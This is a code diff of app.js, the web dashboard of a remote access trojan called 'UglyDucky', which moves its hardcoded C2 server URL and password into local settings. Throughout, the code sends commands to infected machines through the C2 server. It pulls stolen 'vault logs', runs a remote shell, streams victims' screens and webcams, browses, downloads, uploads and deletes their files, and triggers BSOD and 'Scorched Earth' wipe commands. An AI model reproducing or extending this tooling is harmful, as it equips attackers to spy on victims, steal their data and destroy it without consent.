@@ -1,10 +1,10 @@
 // File: app.js
 // ==================================================================
-// --- CONFIGURATION ---
+// --- LOCAL SETTINGS & CONFIGURATION ---
 // ==================================================================
-const C2_LISTENER_URL = "https://uglyducky-c2.onrender.com"; 
-const DASHBOARD_PASSWORD = "ducky_admin_2024"; 
-// ==================================================================
+let C2_LISTENER_URL = localStorage.getItem('ducky_c2_url') || "https://uglyducky-c2.onrender.com"; 
+let DASHBOARD_PASSWORD = localStorage.getItem('ducky_c2_pwd') || "ducky_admin_2024"; 
+let ENABLE_CRT = localStorage.getItem('ducky_c2_crt') !== 'false'; // Defaults to true
 
 // --- GLOBAL STATE ---
 let activeNodeId = null; 
@@ -17,9 +17,9 @@ let leafletMarkers = [];
 
 // --- Live View State ---
 let streamInterval = null;
-let streamSwitchTime = 0; // Prevents fetching old cached frames when switching
-let streamTimeoutTracker = null; // Triggers 10s warning if no frames arrive
-let currentStreamSessionId = null; // Strikout trailing frames from older sessions entirely
+let streamSwitchTime = 0; 
+let streamTimeoutTracker = null; 
+let currentStreamSessionId = null; 
 const STREAM_POLL_RATE = 250; 
 
 // --- Terminal & Filesystem State ---
@@ -38,66 +38,164 @@ let isResizingFloat = false;
 let floatStartX = 0, floatStartY = 0;
 let panelStartLeft = 0, panelStartTop = 0;
 let panelStartWidth = 0, panelStartHeight = 0;
-let floatingStates = {}; // Stores { left, top, width, height, zIndex } keyed by panel.id
-
-// ==========================================
-// UTILITIES
-// ==========================================
-// Bulletproof coordinate parser to prevent Leaflet NaN crashes
-function getSafeCoord(val, isLat) {
-    const defaultCoord = isLat ? 28.5383 : -81.3792;
-    if (val === undefined || val === null || val === '') {
-        return defaultCoord;
-    }
-    const parsed = parseFloat(val);
-    if (isNaN(parsed)) {
-        return defaultCoord;
-    }
-    return parsed;
-}
+let floatingStates = {}; 
 
 // ==========================================
 // INITIALIZATION
 // ==========================================
 document.addEventListener("DOMContentLoaded", () => {
-    switchTab('extraction'); 
+    applySettingsToUI();
+    initXRayScanner();
     initDragAndDrop();
     initResizers();
     initFloatingWindowManager();
+    
+    // Start on the home view
+    switchView('home'); 
     renderNodesList(); 
 });
+
+// ==========================================
+// SETTINGS & UI NAVIGATION
+// ==========================================
+function applySettingsToUI() {
+    document.getElementById('setting-c2-url').value = C2_LISTENER_URL;
+    document.getElementById('setting-dashboard-pwd').value = DASHBOARD_PASSWORD;
+    document.getElementById('setting-crt').checked = ENABLE_CRT;
+    
+    const scanlines = document.getElementById('scanlines');
+    if (ENABLE_CRT) scanlines.classList.add('active');
+    else scanlines.classList.remove('active');
+
+    updateHomeStats();
+}
+
+window.saveSettings = function() {
+    C2_LISTENER_URL = document.getElementById('setting-c2-url').value.trim();
+    DASHBOARD_PASSWORD = document.getElementById('setting-dashboard-pwd').value.trim();
+    ENABLE_CRT = document.getElementById('setting-crt').checked;
+
+    localStorage.setItem('ducky_c2_url', C2_LISTENER_URL);
+    localStorage.setItem('ducky_c2_pwd', DASHBOARD_PASSWORD);
+    localStorage.setItem('ducky_c2_crt', ENABLE_CRT);
+
+    applySettingsToUI();
+    showToast("Settings saved to local storage.", "success");
+};
+
+window.switchView = function(viewId) {
+    // Hide all views
+    document.querySelectorAll('.view-section').forEach(el => el.classList.remove('active'));
+    // Remove active state from all nav buttons
+    document.querySelectorAll('.nav-btn').forEach(el => el.classList.remove('active'));
+    
+    // Activate target view
+    document.getElementById('view-' + viewId).classList.add('active');
+    document.getElementById('nav-' + viewId).classList.add('active');
+    
+    if (viewId === 'rat') {
+        if (!leafletMap) initMap();
+        else setTimeout(() => leafletMap.invalidateSize(true), 100);
+    }
+    
+    if (viewId === 'home') {
+        updateHomeStats();
+    }
+};
+
+function updateHomeStats() {
+    const urlDisplay = document.getElementById('stat-c2-url');
+    if(urlDisplay) {
+        urlDisplay.innerText = C2_LISTENER_URL.replace('https://', '').replace('http://', '');
+    }
+    const nodesDisplay = document.getElementById('stat-nodes');
+    if(nodesDisplay) {
+        nodesDisplay.innerText = allNodes.length;
+    }
+    const recordsDisplay = document.getElementById('stat-records');
+    if(recordsDisplay) {
+        recordsDisplay.innerText = globalData.length;
+    }
+}
+
+// ==========================================
+// THE ARMORY: X-RAY SCANNER
+// ==========================================
+function initXRayScanner() {
+    const container = document.getElementById('xray-container');
+    const xrayImg = document.getElementById('img-xray');
+    const xrayRing = document.getElementById('xray-ring');
+    
+    if(!container || !xrayImg || !xrayRing) return;
+    
+    const radius = 75; 
+
+    container.addEventListener('mousemove', (e) => {
+        const rect = container.getBoundingClientRect();
+        const x = e.clientX - rect.left;
+        const y = e.clientY - rect.top;
+
+        xrayImg.style.clipPath = `circle(${radius}px at ${x}px ${y}px)`;
+        xrayRing.style.left = `${x}px`;
+        xrayRing.style.top = `${y}px`;
+    });
+
+    container.addEventListener('mouseleave', () => {
+        xrayImg.style.clipPath = `circle(0px at center)`;
+    });
+}
+
+// ==========================================
+// UTILITIES
+// ==========================================
+function getSafeCoord(val, isLat) {
+    const defaultCoord = isLat ? 28.5383 : -81.3792;
+    if (val === undefined || val === null || val === '') return defaultCoord;
+    const parsed = parseFloat(val);
+    if (isNaN(parsed)) return defaultCoord;
+    return parsed;
+}
+
+window.showToast = function(msg, type="success") {
+    const toast = document.getElementById('toast');
+    const icon = document.getElementById('toastIcon');
+    document.getElementById('toastMsg').innerText = msg;
+    
+    if (type === "error") {
+        toast.classList.replace('border-neon', 'border-red-500');
+        icon.className = "fa-solid fa-triangle-exclamation text-red-500";
+    } else {
+        toast.classList.replace('border-red-500', 'border-neon');
+        icon.className = "fa-solid fa-circle-check text-neon";
+    }
+    
+    toast.classList.replace('translate-y-24', 'translate-y-0');
+    toast.classList.replace('opacity-0', 'opacity-100');
+    
+    setTimeout(() => {
+        toast.classList.replace('translate-y-0', 'translate-y-24');
+        toast.classList.replace('opacity-100', 'opacity-0');
+    }, 3000);
+};
 
 // ==========================================
 // LEAFLET MAP ENGINE
 // ==========================================
 function initMap() {
     const mapContainer = document.getElementById('map-container');
-    if (!mapContainer || leafletMap) {
-        return;
-    }
+    if (!mapContainer || leafletMap) return;
 
-    const worldBounds = [
-        [-90, -180], 
-        [90, 180]    
-    ];
+    const worldBounds = [[-90, -180], [90, 180]];
 
     leafletMap = L.map('map-container', {
-        zoomControl: false, 
-        attributionControl: false, 
-        maxBounds: worldBounds,       
-        maxBoundsViscosity: 1.0,      
-        minZoom: 2                    
+        zoomControl: false, attributionControl: false, 
+        maxBounds: worldBounds, maxBoundsViscosity: 1.0, minZoom: 2                    
     }).setView([20, 0], 2);
 
     L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png', {
-        subdomains: 'abcd',
-        maxZoom: 19,
-        minZoom: 2,
-        noWrap: true,                 
-        bounds: worldBounds
+        subdomains: 'abcd', maxZoom: 19, minZoom: 2, noWrap: true, bounds: worldBounds
     }).addTo(leafletMap);
 
-    // Dynamic map reflow for free-floating resizing operations
     new ResizeObserver(() => {
         if (leafletMap) leafletMap.invalidateSize();
     }).observe(mapContainer);
@@ -109,10 +207,7 @@ function initMap() {
 }
 
 function renderMap() {
-    if (!leafletMap) {
-        return;
-    }
-
+    if (!leafletMap) return;
     leafletMarkers.forEach(m => leafletMap.removeLayer(m));
     leafletMarkers = [];
     
@@ -131,13 +226,7 @@ function renderMap() {
                 </div>
             </div>`;
 
-        const customIcon = L.divIcon({
-            className: 'bg-transparent border-none', 
-            iconSize: [14, 14], 
-            iconAnchor: [7, 7], 
-            html: customHtml
-        });
-
+        const customIcon = L.divIcon({ className: 'bg-transparent border-none', iconSize: [14, 14], iconAnchor: [7, 7], html: customHtml });
         const marker = L.marker([safeLat, safeLng], { icon: customIcon }).addTo(leafletMap);
         leafletMarkers.push(marker);
     });
@@ -147,36 +236,27 @@ function renderMap() {
 // AUTHENTICATION & FETCHING
 // ==========================================
 document.getElementById("deviceId").addEventListener("keypress", function(e) {
-    if (e.key === "Enter") { 
-        e.preventDefault(); 
-        fetchData(); 
-    }
+    if (e.key === "Enter") { e.preventDefault(); fetchData(); }
 });
 
 async function fetchData() {
     const deviceId = document.getElementById('deviceId').value.trim();
-    if (!deviceId) {
-        return showToast("Target Identifier missing.", "error");
-    }
+    if (!deviceId) return showToast("Target Identifier missing.", "error");
 
     const statusMsg = document.getElementById('statusMsg');
     const btn = document.getElementById('connectBtn');
     
-    allNodes = [];
-    globalData = [];
-    activeNodeId = null;
+    allNodes = []; globalData = []; activeNodeId = null;
     document.getElementById('output').innerHTML = "";
     document.getElementById('filterContainer').classList.add('hidden');
     document.getElementById('exportBtn').classList.add('hidden');
     
-    // Clear out session specific panels
     document.getElementById('fs-active-node').innerText = "None";
     document.getElementById('fsTbody').innerHTML = `<tr><td colspan="4" class="text-center p-4 text-gray-600">Select target node to load files...</td></tr>`;
     document.getElementById('terminal-connection-msg').innerText = "Waiting for node...";
     stopStream();
 
-    renderMap();
-    renderNodesList();
+    renderMap(); renderNodesList(); updateHomeStats();
 
     statusMsg.classList.remove('hidden');
     statusMsg.innerHTML = '<i class="fa-solid fa-circle-notch fa-spin text-cyberBlue mr-2"></i>Contacting Render Server...';
@@ -186,10 +266,7 @@ async function fetchData() {
     try {
         const nodeResponse = await fetch(`${C2_LISTENER_URL}/node/${deviceId}`, {
             method: 'GET',
-            headers: { 
-                "X-Dashboard-Password": DASHBOARD_PASSWORD,
-                "Accept": "application/json"
-            }
+            headers: { "X-Dashboard-Password": DASHBOARD_PASSWORD, "Accept": "application/json" }
         });
         
         if (!nodeResponse.ok) {
@@ -199,40 +276,29 @@ async function fetchData() {
         
         const nodeData = await nodeResponse.json();
         
-        if (!nodeData || typeof nodeData !== 'object' || Array.isArray(nodeData)) {
-            throw new Error("Target data malformed. Backend returned invalid format.");
-        }
-        
         nodeData.lat = getSafeCoord(nodeData.lat, true);
         nodeData.lng = getSafeCoord(nodeData.lng, false);
         
         activeNodeId = nodeData.id;
         allNodes = [nodeData]; 
-        renderNodesList();
-        renderMap();
+        renderNodesList(); renderMap(); updateHomeStats();
         
-        // This triggers the Auto-File Explorer and Shell
         selectNode(activeNodeId); 
 
         statusMsg.innerHTML = '<i class="fa-solid fa-circle-notch fa-spin text-cyberBlue mr-2"></i>Node found. Decrypting vault logs...';
         
         const logsResponse = await fetch(`${C2_LISTENER_URL}/logs/${deviceId}`, {
             method: 'GET',
-            headers: { 
-                "X-Dashboard-Password": DASHBOARD_PASSWORD,
-                "Accept": "application/json"
-            }
+            headers: { "X-Dashboard-Password": DASHBOARD_PASSWORD, "Accept": "application/json" }
         });
         
-        if (!logsResponse.ok) {
-            throw new Error("API Error fetching vault logs.");
-        }
+        if (!logsResponse.ok) throw new Error("API Error fetching vault logs.");
         
-        const logsData = await logsResponse.json();
-        globalData = logsData;
+        globalData = await logsResponse.json();
+        updateHomeStats();
 
         const transitionToControlPanel = () => {
-            switchTab('rat');
+            switchView('rat');
             setTimeout(() => {
                 if (leafletMap) {
                     leafletMap.invalidateSize(true);
@@ -268,9 +334,7 @@ async function fetchData() {
 // ==========================================
 function renderNodesList() {
     const container = document.getElementById('nodes-list');
-    if(!container) {
-        return;
-    }
+    if(!container) return;
     container.innerHTML = '';
     
     if (allNodes.length === 0) {
@@ -287,15 +351,8 @@ function renderNodesList() {
         let osLower = (node.os || "").toLowerCase();
         let osIconClass = 'fa-brands fa-windows text-cyberBlue'; 
         
-        if (osLower.includes('win')) {
-            osIconClass = 'fa-brands fa-windows text-cyberBlue';
-        } else if (osLower.includes('mac') || osLower.includes('darwin')) {
-            osIconClass = 'fa-brands fa-apple text-gray-300';
-        } else if (osLower.includes('linux') || osLower.includes('ubuntu')) {
-            osIconClass = 'fa-brands fa-linux text-yellow-400';
-        } else if (osLower.length > 0) {
-            osIconClass = 'fa-solid fa-desktop text-gray-400';
-        }
+        if (osLower.includes('mac') || osLower.includes('darwin')) osIconClass = 'fa-brands fa-apple text-gray-300';
+        else if (osLower.includes('linux') || osLower.includes('ubuntu')) osIconClass = 'fa-brands fa-linux text-yellow-400';
         
         let safeLat = getSafeCoord(node.lat, true);
         let safeLng = getSafeCoord(node.lng, false);
@@ -325,18 +382,13 @@ window.selectNode = function(nodeId) {
     appendTerminalText(`Session established. Authenticated as: ${nodeId}`, "system");
     document.getElementById('terminal-connection-msg').innerText = `Connected to ${nodeId} via secure reverse proxy`;
     
-    // Automatically start FS rendering
     document.getElementById('fs-active-node').innerText = nodeId;
     requestDirectoryListing('DRIVES');
 
-    if (terminalPollInterval) {
-        clearInterval(terminalPollInterval);
-    }
+    if (terminalPollInterval) clearInterval(terminalPollInterval);
     
     terminalPollInterval = setInterval(async () => {
-        if (!activeNodeId) {
-            return;
-        }
+        if (!activeNodeId) return;
         try {
             const res = await fetch(`${C2_LISTENER_URL}/shell/${activeNodeId}`, {
                 headers: { "X-Dashboard-Password": DASHBOARD_PASSWORD }
@@ -347,22 +399,16 @@ window.selectNode = function(nodeId) {
                     data.outputs.forEach(out => appendTerminalText(out, "output"));
                 }
             }
-        } catch(e) {
-            // Silently fail polling
-        }
+        } catch(e) {}
     }, 2000); 
 };
 
 function appendTerminalText(msg, type="system") {
     const term = document.getElementById('terminal-output');
-    if(!term) {
-        return;
-    }
+    if(!term) return;
     
     const promptEl = term.querySelector('.terminal-prompt');
-    if (promptEl) {
-        promptEl.remove();
-    }
+    if (promptEl) promptEl.remove();
 
     const line = document.createElement('div');
     if (type === "system") {
@@ -379,31 +425,27 @@ function appendTerminalText(msg, type="system") {
     
     const prompt = document.createElement('div'); 
     prompt.className = "mt-2 text-green-400 terminal-prompt flex flex-shrink-0"; 
-    prompt.innerHTML = `<span class="mr-2">C:\\Users\\System></span> <span class="cursor-blink"></span>`;
+    prompt.innerHTML = `<span class="mr-2">C:\\></span> <span class="cursor-blink"></span>`;
     term.appendChild(prompt);
     
     term.scrollTop = term.scrollHeight;
 }
 
-window.termLog = function(msg) { 
-    appendTerminalText(msg, "system"); 
-};
+window.termLog = function(msg) { appendTerminalText(msg, "system"); };
 
 window.executeTermCommand = function(inputEl) {
     const val = inputEl.value.trim();
-    if(!val) {
-        return;
-    }
+    if(!val) return;
     
-    appendTerminalText(`C:\\Users\\System> ${val}`, "user");
+    appendTerminalText(`C:\\> ${val}`, "user");
     
     setTimeout(() => {
         if(val.toLowerCase() === 'clear' || val.toLowerCase() === 'cls') { 
             const term = document.getElementById('terminal-output');
             term.innerHTML = `
-                <div class="text-cyberBlue">UglyDucky Shell v2.5.0</div>
+                <div class="text-cyberBlue">UglyDucky Shell v3.0.0</div>
                 <div class="mt-2 text-green-400 terminal-prompt flex flex-shrink-0">
-                    <span class="mr-2">C:\\Users\\System></span> <span class="cursor-blink"></span>
+                    <span class="mr-2">C:\\></span> <span class="cursor-blink"></span>
                 </div>`;
             inputEl.value = ''; 
             return; 
@@ -425,23 +467,16 @@ window.executeTermCommand = function(inputEl) {
 // C2 COMMAND FUNCTIONS
 // ==========================================
 async function sendCommandToNode(deviceId, command) {
-    if (!deviceId) {
-        return showToast("No active node selected!", "error");
-    }
+    if (!deviceId) return showToast("No active node selected!", "error");
     
     try {
         const response = await fetch(`${C2_LISTENER_URL}/issue`, {
             method: 'POST',
-            headers: {
-                'Content-Type': 'application/json',
-                'X-Dashboard-Password': DASHBOARD_PASSWORD 
-            },
+            headers: { 'Content-Type': 'application/json', 'X-Dashboard-Password': DASHBOARD_PASSWORD },
             body: JSON.stringify({ device_id: deviceId, command: command })
         });
         
-        if (!response.ok) {
-            throw new Error(`Server responded with ${response.status}`);
-        }
+        if (!response.ok) throw new Error(`Server responded with ${response.status}`);
     } catch (error) {
         showToast(`Failed to send command.`, "error");
         termLog(`[ERROR] Failed to send command: ${error.message}`);
@@ -455,17 +490,13 @@ function setStreamLoadingState() {
     const spinner = document.getElementById('liveViewSpinner');
     const imageEl = document.getElementById('liveViewImage');
     
-    // Clear out visually
     imageEl.style.display = 'none';
     imageEl.src = ''; 
     
-    // Setup spinner
     spinner.style.display = 'flex';
     spinner.innerHTML = `<i class="fa-solid fa-circle-notch fa-spin text-cyberBlue text-3xl mb-2"></i><p class="text-gray-400 font-mono text-[10px]">Retrieving stream frames...</p>`;
     
-    if (streamTimeoutTracker) {
-        clearTimeout(streamTimeoutTracker);
-    }
+    if (streamTimeoutTracker) clearTimeout(streamTimeoutTracker);
     
     streamTimeoutTracker = setTimeout(() => {
         spinner.innerHTML = `<i class="fa-solid fa-triangle-exclamation text-yellow-500 text-3xl mb-2"></i><p class="text-gray-400 font-mono text-[10px] text-center px-4">Timeout exceeded (10s).<br>Target may be offline.</p>`;
@@ -473,15 +504,9 @@ function setStreamLoadingState() {
 }
 
 window.toggleStream = function() {
-    if (!activeNodeId) {
-        return showToast("No active node selected!", "error");
-    }
-
-    if (streamInterval) {
-        stopStream();
-    } else {
-        startStream();
-    }
+    if (!activeNodeId) return showToast("No active node selected!", "error");
+    if (streamInterval) stopStream();
+    else startStream();
 };
 
 window.changeStreamQuality = function(val) {
@@ -493,26 +518,20 @@ window.changeStreamQuality = function(val) {
 };
 
 window.startStream = async function() {
-    if (!activeNodeId) {
-        return showToast("No active node selected!", "error");
-    }
+    if (!activeNodeId) return showToast("No active node selected!", "error");
 
-    // Ensure panel is not minimized
     const panel = document.getElementById('panel-live');
     if (panel.dataset.minimized === 'true') {
         toggleMinimize(panel.querySelector('.fa-window-restore').parentElement, 'panel-live');
     }
 
-    if (streamInterval) {
-        stopStream(); 
-    }
+    if (streamInterval) stopStream(); 
 
     const targetVal = document.getElementById('streamTarget').value;
     const quality = document.getElementById('streamQuality').value;
     const title = document.getElementById('liveViewTitle');
     const toggleBtn = document.getElementById('streamToggleBtn');
     
-    // Unique ID generation for this specific fetch session loop
     currentStreamSessionId = Date.now();
     streamSwitchTime = Date.now();
     setStreamLoadingState();
@@ -528,10 +547,9 @@ window.startStream = async function() {
     termLog(`Initiating stream for ${targetVal} at Quality ${quality}...`);
     await sendCommandToNode(activeNodeId, `START_STREAM:${targetVal}|${quality}`);
     
-    // Bind dynamic source change
     document.getElementById('streamTarget').onchange = () => {
         if(streamInterval) {
-            currentStreamSessionId = Date.now(); // Renew the loop session tracking
+            currentStreamSessionId = Date.now();
             streamSwitchTime = Date.now();
             setStreamLoadingState(); 
             termLog(`Switching stream source...`);
@@ -549,16 +567,10 @@ window.startStream = async function() {
 };
 
 async function fetchFrame() {
-    if (!activeNodeId || !currentStreamSessionId) {
-        return;
-    }
-    
+    if (!activeNodeId || !currentStreamSessionId) return;
     const mySessionId = currentStreamSessionId;
 
-    // Ignore fetched frames for 3.5 seconds after a switch to prevent bleeding old cache
-    if (Date.now() - streamSwitchTime < 3500) {
-        return;
-    }
+    if (Date.now() - streamSwitchTime < 3500) return;
     
     const targetVal = document.getElementById('streamTarget').value;
     const cacheKey = targetVal === 'WEBCAM' ? 'webcam' : targetVal.toLowerCase();
@@ -568,10 +580,7 @@ async function fetchFrame() {
             headers: { "X-Dashboard-Password": DASHBOARD_PASSWORD }
         });
         
-        // Critical verification: did the user click stop or switch monitors while we were fetching?
-        if (mySessionId !== currentStreamSessionId) {
-            return; // Destroy the delayed frame to prevent it from bleeding over
-        }
+        if (mySessionId !== currentStreamSessionId) return;
         
         if (response.ok) {
             const data = await response.json();
@@ -588,22 +597,13 @@ async function fetchFrame() {
                 imageEl.style.display = 'block';
             }
         }
-    } catch (e) {
-        // Silent error
-    }
+    } catch (e) {}
 }
 
 window.stopStream = function() {
-    if (streamInterval) {
-        clearInterval(streamInterval);
-        streamInterval = null;
-    }
-    if (streamTimeoutTracker) {
-        clearTimeout(streamTimeoutTracker);
-        streamTimeoutTracker = null;
-    }
+    if (streamInterval) { clearInterval(streamInterval); streamInterval = null; }
+    if (streamTimeoutTracker) { clearTimeout(streamTimeoutTracker); streamTimeoutTracker = null; }
     
-    // Flushes validation so trailing delayed fetches get nuked automatically
     currentStreamSessionId = null;
     
     if (activeNodeId) {
@@ -620,7 +620,7 @@ window.stopStream = function() {
     
     const imageEl = document.getElementById('liveViewImage');
     imageEl.style.display = 'none';
-    imageEl.src = ''; // Guarantee visual cache flush
+    imageEl.src = ''; 
     
     document.getElementById('liveViewTitle').innerHTML = `<i class="fa-solid fa-satellite-dish text-gray-500 mr-2"></i>Live Stream`;
     
@@ -631,9 +631,6 @@ window.stopStream = function() {
     }
 };
 
-// ==========================================
-// POWERFUL MODULES (SCORCHED EARTH & FUN)
-// ==========================================
 window.triggerBSOD = function() {
     termLog('Command queued: BSOD (Blue Screen)');
     sendCommandToNode(activeNodeId, 'BSOD');
@@ -650,13 +647,9 @@ window.triggerScorchedEarth = function() {
 // FILE EXPLORER
 // ==========================================
 function requestDirectoryListing(path) {
-    if (!activeNodeId) {
-        return;
-    }
+    if (!activeNodeId) return;
 
-    if (fsPollInterval) {
-        clearInterval(fsPollInterval);
-    }
+    if (fsPollInterval) clearInterval(fsPollInterval);
 
     currentFsPath = path;
     updateBreadcrumbs(path);
@@ -700,9 +693,7 @@ function requestDirectoryListing(path) {
                 const data = await response.json();
                 renderFileSystem(data);
             }
-        } catch (e) {
-            console.error("FS poll error:", e);
-        }
+        } catch (e) {}
     }, FS_POLL_RATE);
 }
 
@@ -733,9 +724,7 @@ function renderFileSystem(data) {
     }
 
     data.contents.sort((a, b) => {
-        if (a.type === b.type) {
-            return a.name.localeCompare(b.name, undefined, {numeric: true});
-        }
+        if (a.type === b.type) return a.name.localeCompare(b.name, undefined, {numeric: true});
         return a.type === 'directory' || a.type === 'drive' ? -1 : 1;
     });
 
@@ -746,71 +735,36 @@ function renderFileSystem(data) {
         let actionButtons = '';
         if (item.type !== 'drive' && item.type !== 'inaccessible') {
             const isDir = item.type === 'directory';
-            
             if (!isDir) {
-                actionButtons += `
-                    <button class="text-cyberBlue hover:text-white mx-0.5" title="Download" onclick="event.stopPropagation(); downloadFile('${fullPath}')">
-                        <i class="fa-solid fa-download"></i>
-                    </button>
-                `;
+                actionButtons += `<button class="text-cyberBlue hover:text-white mx-0.5" title="Download" onclick="event.stopPropagation(); downloadFile('${fullPath}')"><i class="fa-solid fa-download"></i></button>`;
             }
-            
-            actionButtons += `
-                <button class="text-yellow-500 hover:text-white mx-0.5" title="Rename" onclick="event.stopPropagation(); renameItem('${fullPath}', '${escapeHtml(item.name.replace(/'/g, "\\'"))}')">
-                    <i class="fa-solid fa-pen"></i>
-                </button>
-            `;
-            
-            actionButtons += `
-                <button class="text-red-500 hover:text-white mx-0.5" title="Delete" onclick="event.stopPropagation(); deleteItem('${fullPath}', ${isDir})">
-                    <i class="fa-solid fa-trash"></i>
-                </button>
-            `;
+            actionButtons += `<button class="text-yellow-500 hover:text-white mx-0.5" title="Rename" onclick="event.stopPropagation(); renameItem('${fullPath}', '${escapeHtml(item.name.replace(/'/g, "\\'"))}')"><i class="fa-solid fa-pen"></i></button>`;
+            actionButtons += `<button class="text-red-500 hover:text-white mx-0.5" title="Delete" onclick="event.stopPropagation(); deleteItem('${fullPath}', ${isDir})"><i class="fa-solid fa-trash"></i></button>`;
         }
 
         switch (item.type) {
             case 'drive':
-                icon = 'fa-hdd'; 
-                color = 'text-gray-400';
-                action = `onclick="requestDirectoryListing('${fullPath}')"`;
-                break;
+                icon = 'fa-hdd'; color = 'text-gray-400';
+                action = `onclick="requestDirectoryListing('${fullPath}')"`; break;
             case 'directory':
-                icon = 'fa-folder'; 
-                color = 'text-yellow-500';
-                action = `onclick="requestDirectoryListing('${fullPath}')"`;
-                break;
+                icon = 'fa-folder'; color = 'text-yellow-500';
+                action = `onclick="requestDirectoryListing('${fullPath}')"`; break;
             case 'file':
-                icon = 'fa-file-lines'; 
-                color = 'text-cyberBlue';
-                action = ``;
-                break;
+                icon = 'fa-file-lines'; color = 'text-cyberBlue'; action = ``; break;
             default:
-                icon = 'fa-ban'; 
-                color = 'text-red-600';
-                action = `title="Permission Denied"`;
-                break;
+                icon = 'fa-ban'; color = 'text-red-600'; action = `title="Permission Denied"`; break;
         }
 
         const size = item.size > 0 ? formatBytes(item.size) : '';
-
         const row = document.createElement('tr');
         row.className = 'border-b border-gray-800/60 hover:bg-neon/10 transition-colors cursor-pointer';
         
         row.innerHTML = `
-            <td class="p-1.5 pl-2 text-center ${color}" ${action}>
-                <i class="fa-regular ${icon}"></i>
-            </td>
-            <td class="p-1.5 font-bold text-gray-300 truncate max-w-[100px]" ${action} title="${escapeHtml(item.name)}">
-                ${escapeHtml(item.name)}
-            </td>
-            <td class="p-1.5 text-right text-gray-400 whitespace-nowrap" ${action}>
-                ${size}
-            </td>
-            <td class="p-1.5 text-center whitespace-nowrap">
-                ${actionButtons}
-            </td>
+            <td class="p-1.5 pl-2 text-center ${color}" ${action}><i class="fa-regular ${icon}"></i></td>
+            <td class="p-1.5 font-bold text-gray-300 truncate max-w-[100px]" ${action} title="${escapeHtml(item.name)}">${escapeHtml(item.name)}</td>
+            <td class="p-1.5 text-right text-gray-400 whitespace-nowrap" ${action}>${size}</td>
+            <td class="p-1.5 text-center whitespace-nowrap">${actionButtons}</td>
         `;
-        
         tbody.appendChild(row);
     });
 }
@@ -840,9 +794,7 @@ window.downloadFile = function(fullPath) {
     sendCommandToNode(activeNodeId, `DOWNLOAD_FILE:${fullPath}`);
     showToast(`Requesting download (May take a moment)`);
     
-    if (downloadPollInterval) {
-        clearInterval(downloadPollInterval);
-    }
+    if (downloadPollInterval) clearInterval(downloadPollInterval);
     
     const startTime = Date.now();
     
@@ -852,19 +804,16 @@ window.downloadFile = function(fullPath) {
             showToast("Download timed out or file too large.", "error");
             return;
         }
-        
         try {
             const res = await fetch(`${C2_LISTENER_URL}/fs_download/${activeNodeId}`, { 
                 headers: {'X-Dashboard-Password': DASHBOARD_PASSWORD} 
             });
-            
             if (res.ok) {
                 clearInterval(downloadPollInterval);
                 const data = await res.json();
                 
-                if(data.error) {
-                    showToast(`Download failed: ${data.error}`, "error");
-                } else if(data.data && data.filename) {
+                if(data.error) showToast(`Download failed: ${data.error}`, "error");
+                else if(data.data && data.filename) {
                     const link = document.createElement('a');
                     link.href = 'data:application/octet-stream;base64,' + data.data;
                     link.download = data.filename;
@@ -874,27 +823,17 @@ window.downloadFile = function(fullPath) {
                     showToast("Download complete!", "success");
                 }
             }
-        } catch(e) { 
-            // Silent error handles
-        }
+        } catch(e) {}
     }, 2000);
 };
 
-window.triggerUpload = function() { 
-    document.getElementById('fileUploadInput').click(); 
-};
+window.triggerUpload = function() { document.getElementById('fileUploadInput').click(); };
 
 document.getElementById('fileUploadInput').onchange = function(e) { 
     const file = e.target.files[0];
-    if(!file) {
-        return;
-    }
-    if(!currentFsPath || currentFsPath === 'DRIVES') {
-        return showToast("Navigate to a directory first.", "error");
-    }
-    if(file.size > 10 * 1024 * 1024) {
-        return showToast("File exceeds 10MB limit.", "error");
-    }
+    if(!file) return;
+    if(!currentFsPath || currentFsPath === 'DRIVES') return showToast("Navigate to a directory first.", "error");
+    if(file.size > 10 * 1024 * 1024) return showToast("File exceeds 10MB limit.", "error");
 
     const reader = new FileReader();
     reader.onload = function(evt) {
@@ -926,21 +865,13 @@ function updateBreadcrumbs(path) {
         currentPath += part + '\\\\';
         const isLast = index === parts.length - 1;
         
-        if (isLast) {
-            container.innerHTML += `<span class="text-white font-bold">${escapeHtml(part)}</span>`;
-        } else {
-            container.innerHTML += `
-                <span class="text-gray-400 hover:text-white cursor-pointer" onclick="requestDirectoryListing('${currentPath}')">${escapeHtml(part)}</span>
-                <span class="text-gray-600 mx-0.5">/</span>
-            `;
-        }
+        if (isLast) container.innerHTML += `<span class="text-white font-bold">${escapeHtml(part)}</span>`;
+        else container.innerHTML += `<span class="text-gray-400 hover:text-white cursor-pointer" onclick="requestDirectoryListing('${currentPath}')">${escapeHtml(part)}</span><span class="text-gray-600 mx-0.5">/</span>`;
     });
 }
 
 function formatBytes(bytes, decimals = 1) {
-    if (bytes === 0) {
-        return '0 B';
-    }
+    if (bytes === 0) return '0 B';
     const k = 1024;
     const dm = decimals < 0 ? 0 : decimals;
     const sizes = ['B', 'KB', 'MB', 'GB'];
@@ -949,75 +880,14 @@ function formatBytes(bytes, decimals = 1) {
 }
 
 window.navigateUp = function() {
-    if (!currentFsPath || currentFsPath === 'DRIVES') {
-        requestDirectoryListing('DRIVES');
-        return;
-    }
-    
-    if (currentFsPath.endsWith(':\\') && currentFsPath.length === 3) {
-        requestDirectoryListing('DRIVES');
-        return;
-    }
+    if (!currentFsPath || currentFsPath === 'DRIVES') return requestDirectoryListing('DRIVES');
+    if (currentFsPath.endsWith(':\\') && currentFsPath.length === 3) return requestDirectoryListing('DRIVES');
     
     const lastSlash = currentFsPath.replace(/\\$/, '').lastIndexOf('\\');
     
-    if (lastSlash === -1) {
-        requestDirectoryListing('DRIVES');
-    } else if (lastSlash === 2 && currentFsPath[1] === ':') {
-        let parentPath = currentFsPath.substring(0, lastSlash + 1);
-        requestDirectoryListing(parentPath);
-    } else {
-        let parentPath = currentFsPath.substring(0, lastSlash);
-        requestDirectoryListing(parentPath);
-    }
-};
-
-// ==========================================
-// UI & TAB LOGIC
-// ==========================================
-window.switchTab = function(tabId) {
-    document.querySelectorAll('.tab-content').forEach(el => el.classList.remove('active'));
-    
-    document.getElementById('tab-extraction').className = "px-6 py-1.5 rounded-md font-semibold text-sm transition-all text-gray-400 hover:text-white hover:bg-white/5";
-    document.getElementById('tab-rat').className = "px-6 py-1.5 rounded-md font-semibold text-sm transition-all text-gray-400 hover:text-white hover:bg-white/5";
-    
-    document.getElementById('view-' + tabId).classList.add('active');
-    
-    const activeColor = tabId === 'extraction' 
-        ? 'bg-cyberBlue text-dark shadow-[0_0_15px_rgba(0,210,211,0.3)]' 
